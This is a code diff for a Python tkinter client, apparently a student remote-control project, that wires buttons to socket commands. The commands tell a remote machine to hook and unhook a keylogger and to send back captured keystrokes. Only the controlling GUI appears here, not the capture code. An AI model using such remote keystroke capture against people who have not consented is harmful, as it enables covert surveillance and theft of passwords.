@@ -7,6 +7,7 @@ import os
 import signal
 import psutil
 import subprocess
+import keylog
 from tkinter import scrolledtext as scrllT
 import cli
 
@@ -363,33 +364,26 @@ def keyStroke():
         win = Toplevel()
         win.title('Keystroke')
         win.geometry('500x500')
-        sock.Send('Keystroke')
         def hook():
             sock.Send('Hook')
-            #Gửi báo hiệu keylog
-            a='' #Để cho đỡ báo lỗi
-
         def unhook():
             sock.Send('Unhook')
-            #Gửi báo hiệu thoát keylog
-            a=''
-
         def xoa():
             global output_key
             output_key.configure(state=NORMAL)
             output_key.delete('1.0', END)
 
-
         def inphim():
+            sock.Send('Print key')
             global output_key
-            data = sock.Receive().decode()   #Dữ liệu nhận từ server 
+            data = sock.Receive()   #Dữ liệu nhận từ server 
             output_key.configure(state=NORMAL)
             output_key.insert(END,data)
             output_key.configure(state=DISABLED)
 
-        hook_ = exTK.Button(win, text='Hook').place(
+        hook_ = exTK.Button(win, text='Hook', command = hook).place(
             relheight=0.1, relwidth=0.2, relx=0.04, rely=0.075)
-        unhook_ = exTK.Button(win, text='Unhook').place(
+        unhook_ = exTK.Button(win, text='Unhook',command = unhook).place(
             relheight=0.1, relwidth=0.2, relx=0.28, rely=0.075)
         inphim_ = exTK.Button(win, text='In phím',command=inphim).place(
             relheight=0.1, relwidth=0.2, relx=0.52, rely=0.075)
